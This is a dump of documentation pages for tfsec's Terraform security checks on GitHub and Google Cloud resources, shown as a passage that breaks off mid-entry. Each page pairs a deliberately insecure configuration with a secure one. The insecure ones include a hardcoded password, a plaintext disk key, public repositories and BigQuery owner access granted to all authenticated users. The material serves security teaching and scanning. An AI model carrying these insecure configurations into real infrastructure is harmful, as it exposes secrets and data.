{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/general/secrets/no-plaintext-exposure/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/general/secrets/no-plaintext-exposure/index.md", "content": "---\ntitle: Secret/sensitive data should not be exposed in plaintext.\n---\n\n# Secret/sensitive data should not be exposed in plaintext.\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nPlaintext secrets kept in source code or similar media mean sensitive data is exposed to any users/systems with access to the source code.\n\n### Possible Impact\nSensitive data can be leaked to unauthorised people or systems.\n\n### Suggested Resolution\nRemove plaintext secrets and encrypt them within a secrets manager instead.\n\n\n### Insecure Example\n\nThe following example will fail the general-secrets-no-plaintext-exposure check.\n```terraform\n\n variable \"password\" {\n   description = \"The root password for our VM\"\n   type        = string\n   default     = \"p4ssw0rd\"\n }\n \n resource \"evil_corp\" \"virtual_machine\" {\n \troot_password = var.password\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the general-secrets-no-plaintext-exposure check.\n```terraform\n\n variable \"password\" {\n   description = \"The root password for our VM\"\n   type        = string\n }\n \n resource \"evil_corp\" \"virtual_machine\" {\n \troot_password = var.password\n }\n \n```\n\n\n\n### Links\n\n\n- [https://www.terraform.io/docs/state/sensitive-data.html](https://www.terraform.io/docs/state/sensitive-data.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:00.664552"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/github/actions/no-plain-text-action-secrets/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/github/actions/no-plain-text-action-secrets/index.md", "content": "---\ntitle: Ensure plaintext value is not used for GitHub Action Environment Secret.\n---\n\n# Ensure plaintext value is not used for GitHub Action Environment Secret.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nFor the purposes of security, the contents of the plaintext_value field have been marked as sensitive to Terraform, but this does not hide it from state files. State should be treated as sensitive always.\n\n### Possible Impact\nUnencrypted sensitive plaintext value can be easily accessible in code.\n\n### Suggested Resolution\nDo not store plaintext values in your code but rather populate the encrypted_value using fields from a resource, data source or variable.\n\n\n### Insecure Example\n\nThe following example will fail the github-actions-no-plain-text-action-secrets check.\n```terraform\n\nresource \"github_actions_environment_secret\" \"bad_example\" {\t \n\trepository       = \"my repository name\"\n\tenvironment       = \"my environment\"\n\tsecret_name       = \"my secret name\"\n\tplaintext_value   = \"sensitive secret string\"\n}\n\n```\n\n\n\n### Secure Example\n\nThe following example will pass the github-actions-no-plain-text-action-secrets check.\n```terraform\n\nresource \"github_actions_environment_secret\" \"good_example\" {\n\trepository       = \"my repository name\"\n\tenvironment       = \"my environment\"\n\tsecret_name       = \"my secret name\"\n\tencrypted_value   = var.some_encrypted_secret_string\n}\n\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/integrations/github/latest/docs/resources/actions_environment_secret](https://registry.terraform.io/providers/integrations/github/latest/docs/resources/actions_environment_secret){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://registry.terraform.io/providers/integrations/github/latest/docs/resources/actions_environment_secret](https://registry.terraform.io/providers/integrations/github/latest/docs/resources/actions_environment_secret){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:01.375110"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/github/branch_protections/require_signed_commits/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/github/branch_protections/require_signed_commits/index.md", "content": "---\ntitle: GitHub branch protection does not require signed commits.\n---\n\n# GitHub branch protection does not require signed commits.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nGitHub branch protection should be set to require signed commits.\n\nYou can do this by setting the <code>require_signed_commits</code> attribute to 'true'.\n\n### Possible Impact\nCommits may not be verified and signed as coming from a trusted developer\n\n### Suggested Resolution\nRequire signed commits\n\n\n### Insecure Example\n\nThe following example will fail the github-branch_protections-require_signed_commits check.\n```terraform\n\n resource \"github_branch_protection\" \"good_example\" {\n   repository_id = \"example\"\n   pattern       = \"main\"\n\n   require_signed_commits = false\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the github-branch_protections-require_signed_commits check.\n```terraform\n\n resource \"github_branch_protection\" \"good_example\" {\n   repository_id = \"example\"\n   pattern       = \"main\"\n\n   require_signed_commits = true\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/integrations/github/latest/docs/resources/branch_protection](https://registry.terraform.io/providers/integrations/github/latest/docs/resources/branch_protection){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://registry.terraform.io/providers/integrations/github/latest/docs/resources/branch_protection#require_signed_commits](https://registry.terraform.io/providers/integrations/github/latest/docs/resources/branch_protection#require_signed_commits){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.github.com/en/authentication/managing-commit-signature-verification/about-commit-signature-verification](https://docs.github.com/en/authentication/managing-commit-signature-verification/about-commit-signature-verification){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/defining-the-mergeability-of-pull-requests/about-protected-branches#require-signed-commits](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/defining-the-mergeability-of-pull-requests/about-protected-branches#require-signed-commits){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:01.928897"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/github/repositories/enable_vulnerability_alerts/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/github/repositories/enable_vulnerability_alerts/index.md", "content": "---\ntitle: GitHub repository has vulnerability alerts disabled.\n---\n\n# GitHub repository has vulnerability alerts disabled.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nGitHub repository should be set to use vulnerability alerts.\n\nYou can do this by setting the <code>vulnerability_alerts</code> attribute to 'true'.\n\n### Possible Impact\nKnown vulnerabilities may not be discovered\n\n### Suggested Resolution\nEnable vulnerability alerts\n\n\n### Insecure Example\n\nThe following example will fail the github-repositories-enable_vulnerability_alerts check.\n```terraform\n\n resource \"github_repository\" \"bad_example\" {\n   name        = \"example\"\n   description = \"My awesome codebase\"\n\n   vulnerability_alerts = false\n\n   template {\n     owner = \"github\"\n     repository = \"terraform-module-template\"\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the github-repositories-enable_vulnerability_alerts check.\n```terraform\n\n resource \"github_repository\" \"good_example\" {\n   name        = \"example\"\n   description = \"My awesome codebase\"\n\n   vulnerability_alerts = true\n\n   template {\n     owner = \"github\"\n     repository = \"terraform-module-template\"\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/integrations/github/latest/docs/resources/repository](https://registry.terraform.io/providers/integrations/github/latest/docs/resources/repository){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.github.com/en/code-security/supply-chain-security/managing-vulnerabilities-in-your-projects-dependencies/about-alerts-for-vulnerable-dependencies](https://docs.github.com/en/code-security/supply-chain-security/managing-vulnerabilities-in-your-projects-dependencies/about-alerts-for-vulnerable-dependencies){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:02.451544"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/github/repositories/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/github/repositories/index.md", "content": "---\ntitle: repositories\n---\n\n# repositories\n\n## Checks\n\n\n- [enable_vulnerability_alerts](enable_vulnerability_alerts) GitHub repository has vulnerability alerts disabled.\n\n- [private](private) Github repository shouldn't be public.\n\n\n\n", "timestamp": "2025-10-24T22:25:02.557058"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/github/repositories/private/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/github/repositories/private/index.md", "content": "---\ntitle: Github repository shouldn't be public.\n---\n\n# Github repository shouldn't be public.\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nGithub repository should be set to be private.\n\nYou can do this by either setting <code>private</code> attribute to 'true' or <code>visibility</code> attribute to 'internal' or 'private'.\n\n### Possible Impact\nAnyone can read the contents of the GitHub repository and leak IP\n\n### Suggested Resolution\nMake sensitive or commercially important repositories private\n\n\n### Insecure Example\n\nThe following example will fail the github-repositories-private check.\n```terraform\n\n resource \"github_repository\" \"bad_example\" {\n   name        = \"example\"\n   description = \"My awesome codebase\"\n \n   visibility  = \"public\"\n \n   template {\n     owner = \"github\"\n     repository = \"terraform-module-template\"\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the github-repositories-private check.\n```terraform\n\n resource \"github_repository\" \"good_example\" {\n   name        = \"example\"\n   description = \"My awesome codebase\"\n \n   visibility  = \"private\"\n \n   template {\n     owner = \"github\"\n     repository = \"terraform-module-template\"\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/integrations/github/latest/docs/resources/repository](https://registry.terraform.io/providers/integrations/github/latest/docs/resources/repository){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.github.com/en/github/creating-cloning-and-archiving-repositories/about-repository-visibility](https://docs.github.com/en/github/creating-cloning-and-archiving-repositories/about-repository-visibility){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.github.com/en/github/creating-cloning-and-archiving-repositories/about-repository-visibility#about-internal-repositories](https://docs.github.com/en/github/creating-cloning-and-archiving-repositories/about-repository-visibility#about-internal-repositories){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:02.846543"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/bigquery/no-public-access/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/bigquery/no-public-access/index.md", "content": "---\ntitle: BigQuery datasets should only be accessible within the organisation\n---\n\n# BigQuery datasets should only be accessible within the organisation\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nUsing 'allAuthenticatedUsers' provides any GCP user - even those outside of your organisation - access to your BigQuery dataset.\n\n### Possible Impact\nExposure of sensitive data to the public iniernet\n\n### Suggested Resolution\nConfigure access permissions with higher granularity\n\n\n### Insecure Example\n\nThe following example will fail the google-bigquery-no-public-access check.\n```terraform\n\n resource \"google_bigquery_dataset\" \"bad_example\" {\n   dataset_id                  = \"example_dataset\"\n   friendly_name               = \"test\"\n   description                 = \"This is a test description\"\n   location                    = \"EU\"\n   default_table_expiration_ms = 3600000\n \n   labels = {\n     env = \"default\"\n   }\n \n   access {\n     role          = \"OWNER\"\n     special_group = \"allAuthenticatedUsers\"\n   }\n \n   access {\n     role   = \"READER\"\n     domain = \"hashicorp.com\"\n   }\n }\n \n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-bigquery-no-public-access check.\n```terraform\n\n resource \"google_bigquery_dataset\" \"good_example\" {\n   dataset_id                  = \"example_dataset\"\n   friendly_name               = \"test\"\n   description                 = \"This is a test description\"\n   location                    = \"EU\"\n   default_table_expiration_ms = 3600000\n \n   labels = {\n     env = \"default\"\n   }\n \n   access {\n     role          = \"OWNER\"\n     user_by_email = google_service_account.bqowner.email\n   }\n \n   access {\n     role   = \"READER\"\n     domain = \"hashicorp.com\"\n   }\n }\n \n resource \"google_service_account\" \"bqowner\" {\n   account_id = \"bqowner\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/bigquery_dataset#special_group](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/bigquery_dataset#special_group){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:03.592920"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/compute/disk-encryption-customer-key/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/compute/disk-encryption-customer-key/index.md", "content": "---\ntitle: Disks should be encrypted with customer managed encryption keys\n---\n\n# Disks should be encrypted with customer managed encryption keys\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nUsing unmanaged keys makes rotation and general management difficult.\n\n### Possible Impact\nUsing unmanaged keys does not allow for proper key management.\n\n### Suggested Resolution\nUse managed keys to encrypt disks.\n\n\n### Insecure Example\n\nThe following example will fail the google-compute-disk-encryption-customer-key check.\n```terraform\n\n resource \"google_compute_disk\" \"bad_example\" {\n   name  = \"test-disk\"\n   type  = \"pd-ssd\"\n   zone  = \"us-central1-a\"\n   image = \"debian-9-stretch-v20200805\"\n   labels = {\n     environment = \"dev\"\n   }\n   physical_block_size_bytes = 4096\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-compute-disk-encryption-customer-key check.\n```terraform\n\n resource \"google_compute_disk\" \"good_example\" {\n   name  = \"test-disk\"\n   type  = \"pd-ssd\"\n   zone  = \"us-central1-a\"\n   image = \"debian-9-stretch-v20200805\"\n   labels = {\n     environment = \"dev\"\n   }\n   physical_block_size_bytes = 4096\n   disk_encryption_key {\n     kms_key_self_link = \"something\"\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_disk#kms_key_self_link](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_disk#kms_key_self_link){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:04.014339"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/compute/disk-encryption-no-plaintext-key/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/compute/disk-encryption-no-plaintext-key/index.md", "content": "---\ntitle: The encryption key used to encrypt a compute disk has been specified in plaintext.\n---\n\n# The encryption key used to encrypt a compute disk has been specified in plaintext.\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nSensitive values such as raw encryption keys should not be included in your Terraform code, and should be stored securely by a secrets manager.\n\n### Possible Impact\nThe encryption key should be considered compromised as it is not stored securely.\n\n### Suggested Resolution\nReference a managed key rather than include the key in raw format.\n\n\n### Insecure Example\n\nThe following example will fail the google-compute-disk-encryption-no-plaintext-key check.\n```terraform\n\n resource \"google_compute_disk\" \"good_example\" {\n \tdisk_encryption_key {\n \t\traw_key=\"b2ggbm8gdGhpcyBpcyBiYWQ=\"\n \t}\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-compute-disk-encryption-no-plaintext-key check.\n```terraform\n\n resource \"google_compute_disk\" \"good_example\" {\n \tdisk_encryption_key {\n \t\tkms_key_self_link = google_kms_crypto_key.my_crypto_key.id\n \t}\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_disk#kms_key_self_link](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_disk#kms_key_self_link){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://cloud.google.com/compute/docs/disks/customer-supplied-encryption](https://cloud.google.com/compute/docs/disks/customer-supplied-encryption){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:04.303912"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/compute/enable-shielded-vm-im/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/compute/enable-shielded-vm-im/index.md", "content": "---\ntitle: Instances should have Shielded VM integrity monitoring enabled\n---\n\n# Instances should have Shielded VM integrity monitoring enabled\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nIntegrity monitoring helps you understand and make decisions about the state of your VM instances.\n\n### Possible Impact\nNo visibility of VM instance boot state.\n\n### Suggested Resolution\nEnable Shielded VM Integrity Monitoring\n\n\n### Insecure Example\n\nThe following example will fail the google-compute-enable-shielded-vm-im check.\n```terraform\n\n resource \"google_compute_instance\" \"bad_example\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n \n   tags = [\"foo\", \"bar\"]\n \n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n \n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n \n   shielded_instance_config {\n     enable_integrity_monitoring = false\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-compute-enable-shielded-vm-im check.\n```terraform\n\n resource \"google_compute_instance\" \"bad_example\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n \n   tags = [\"foo\", \"bar\"]\n \n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n \n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n \n   shielded_instance_config {\n     enable_integrity_monitoring = true\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#enable_vtpm](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#enable_vtpm){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://cloud.google.com/security/shielded-cloud/shielded-vm#integrity-monitoring](https://cloud.google.com/security/shielded-cloud/shielded-vm#integrity-monitoring){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:04.588144"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/compute/enable-shielded-vm-vtpm/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/compute/enable-shielded-vm-vtpm/index.md", "content": "---\ntitle: Instances should have Shielded VM VTPM enabled\n---\n\n# Instances should have Shielded VM VTPM enabled\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nThe virtual TPM provides numerous security measures to your VM.\n\n### Possible Impact\nUnable to prevent unwanted system state modification\n\n### Suggested Resolution\nEnable Shielded VM VTPM\n\n\n### Insecure Example\n\nThe following example will fail the google-compute-enable-shielded-vm-vtpm check.\n```terraform\n\n resource \"google_compute_instance\" \"bad_example\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n \n   tags = [\"foo\", \"bar\"]\n \n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n \n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n \n   shielded_instance_config {\n     enable_vtpm = false\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-compute-enable-shielded-vm-vtpm check.\n```terraform\n\n resource \"google_compute_instance\" \"bad_example\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n \n   tags = [\"foo\", \"bar\"]\n \n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n \n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n \n   shielded_instance_config {\n     enable_vtpm = true\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#enable_vtpm](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#enable_vtpm){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://cloud.google.com/blog/products/identity-security/virtual-trusted-platform-module-for-shielded-vms-security-in-plaintext](https://cloud.google.com/blog/products/identity-security/virtual-trusted-platform-module-for-shielded-vms-security-in-plaintext){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:04.853218"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/compute/enable-vpc-flow-logs/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/compute/enable-vpc-flow-logs/index.md", "content": "---\ntitle: VPC flow logs should be enabled for all subnetworks\n---\n\n# VPC flow logs should be enabled for all subnetworks\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nVPC flow logs record information about all traffic, which is a vital tool in reviewing anomalous traffic.\n\n### Possible Impact\nLimited auditing capability and awareness\n\n### Suggested Resolution\nEnable VPC flow logs\n\n\n### Insecure Example\n\nThe following example will fail the google-compute-enable-vpc-flow-logs check.\n```terraform\n\nresource \"google_compute_subnetwork\" \"bad_example\" {\n  name          = \"test-subnetwork\"\n  ip_cidr_range = \"10.2.0.0/16\"\n  region        = \"us-central1\"\n  network       = google_compute_network.custom-test.id\n  secondary_ip_range {\n    range_name    = \"tf-test-secondary-range-update1\"\n    ip_cidr_range = \"192.168.10.0/24\"\n  }\n}\nresource \"google_compute_network\" \"custom-test\" {\n  name                    = \"test-network\"\n  auto_create_subnetworks = false\n}\n\n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-compute-enable-vpc-flow-logs check.\n```terraform\n\nresource \"google_compute_subnetwork\" \"good_example\" {\n  name          = \"test-subnetwork\"\n  ip_cidr_range = \"10.2.0.0/16\"\n  region        = \"us-central1\"\n  network       = google_compute_network.custom-test.id\n  secondary_ip_range {\n    range_name    = \"tf-test-secondary-range-update1\"\n    ip_cidr_range = \"192.168.10.0/24\"\n  }\n  log_config {\n    aggregation_interval = \"INTERVAL_10_MIN\"\n    flow_sampling        = 0.5\n    metadata             = \"INCLUDE_ALL_METADATA\"\n  }\n}\nresource \"google_compute_network\" \"custom-test\" {\n  name                    = \"test-network\"\n  auto_create_subnetworks = false\n}\n\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_subnetwork#enable_flow_logs](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_subnetwork#enable_flow_logs){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:05.144402"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/compute/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/compute/index.md", "content": "---\ntitle: compute\n---\n\n# compute\n\n## Checks\n\n\n- [disk-encryption-customer-key](disk-encryption-customer-key) Disks should be encrypted with customer managed encryption keys\n\n- [disk-encryption-no-plaintext-key](disk-encryption-no-plaintext-key) The encryption key used to encrypt a compute disk has been specified in plaintext.\n\n- [enable-shielded-vm-im](enable-shielded-vm-im) Instances should have Shielded VM integrity monitoring enabled\n\n- [enable-shielded-vm-vtpm](enable-shielded-vm-vtpm) Instances should have Shielded VM VTPM enabled\n\n- [enable-vpc-flow-logs](enable-vpc-flow-logs) VPC flow logs should be enabled for all subnetworks\n\n- [no-default-service-account](no-default-service-account) Instances should not use the default service account\n\n- [no-ip-forwarding](no-ip-forwarding) Instances should not have IP forwarding enabled\n\n- [no-oslogin-override](no-oslogin-override) Instances should not override the project setting for OS Login\n\n- [no-project-wide-ssh-keys](no-project-wide-ssh-keys) Disable project-wide SSH keys for all instances\n\n- [no-public-egress](no-public-egress) An outbound firewall rule allows traffic to /0.\n\n- [no-public-ingress](no-public-ingress) An inbound firewall rule allows traffic from /0.\n\n- [no-public-ip](no-public-ip) Instances should not have public IP addresses\n\n- [no-serial-port](no-serial-port) Disable serial port connectivity for all instances\n\n- [project-level-oslogin](project-level-oslogin) OS Login should be enabled at project level\n\n- [use-secure-tls-policy](use-secure-tls-policy) SSL policies should enforce secure versions of TLS\n\n- [vm-disk-encryption-customer-key](vm-disk-encryption-customer-key) VM disks should be encrypted with Customer Supplied Encryption Keys\n\n\n\n", "timestamp": "2025-10-24T22:25:05.255830"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/compute/no-default-service-account/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/compute/no-default-service-account/index.md", "content": "---\ntitle: Instances should not use the default service account\n---\n\n# Instances should not use the default service account\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nThe default service account has full project access. Instances should instead be assigned the minimal access they need.\n\n### Possible Impact\nInstance has full access to the project\n\n### Suggested Resolution\nRemove use of default service account\n\n\n### Insecure Example\n\nThe following example will fail the google-compute-no-default-service-account check.\n```terraform\n\n resource \"google_compute_instance\" \"default\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n \n   tags = [\"foo\", \"bar\"]\n \n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n \n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n \n   service_account {\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     email  = \"1234567890-compute@developer.gserviceaccount.com\"\n     scopes = [\"cloud-platform\"]\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-compute-no-default-service-account check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service_account_id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_compute_instance\" \"default\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n \n   tags = [\"foo\", \"bar\"]\n \n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n \n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n \n   network_interface {\n     network = \"default\"\n \n     access_config {\n       // Ephemeral IP\n     }\n   }\n \n   metadata = {\n     foo = \"bar\"\n   }\n \n   metadata_startup_script = \"echo hi > /test.txt\"\n \n   service_account {\n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     email  = google_service_account.default.email\n     scopes = [\"cloud-platform\"]\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:05.530627"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/compute/no-ip-forwarding/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/compute/no-ip-forwarding/index.md", "content": "---\ntitle: Instances should not have IP forwarding enabled\n---\n\n# Instances should not have IP forwarding enabled\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nDisabling IP forwarding ensures the instance can only receive packets addressed to the instance and can only send packets with a source address of the instance.\n\n### Possible Impact\nInstance can send/receive packets without the explicit instance address\n\n### Suggested Resolution\nDisable IP forwarding\n\n\n### Insecure Example\n\nThe following example will fail the google-compute-no-ip-forwarding check.\n```terraform\n\n resource \"google_compute_instance\" \"bad_example\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n \n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n \n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n \n   can_ip_forward = true\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-compute-no-ip-forwarding check.\n```terraform\n\n resource \"google_compute_instance\" \"bad_example\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n \n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n \n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n   \n   can_ip_forward = false\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#can_ip_forward](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/compute_instance#can_ip_forward){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:05.874038"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/compute/no-oslogin-override/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/compute/no-oslogin-override/index.md", "content": "---\ntitle: Instances should not override the project setting for OS Login\n---\n\n# Instances should not override the project setting for OS Login\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nOS Login automatically revokes the relevant SSH keys when an IAM user has their access revoked.\n\n### Possible Impact\nAccess via SSH key cannot be revoked automatically when an IAM user is removed.\n\n### Suggested Resolution\nEnable OS Login at project level and remove instance-level overrides\n\n\n### Insecure Example\n\nThe following example will fail the google-compute-no-oslogin-override check.\n```terraform\n\n resource \"google_compute_instance\" \"default\" {\n   name         = \"test\"\n   machine_type = \"e2-medium\"\n   zone         = \"us-central1-a\"\n \n   boot_disk {\n     initialize_params {\n       image = \"debian-cloud/debian-9\"\n     }\n   }\n \n   // Local SSD disk\n   scratch_disk {\n     interface = \"SCSI\"\n   }\n \n   metadata = {\n     enable-oslogin = false\n   }\n }\n 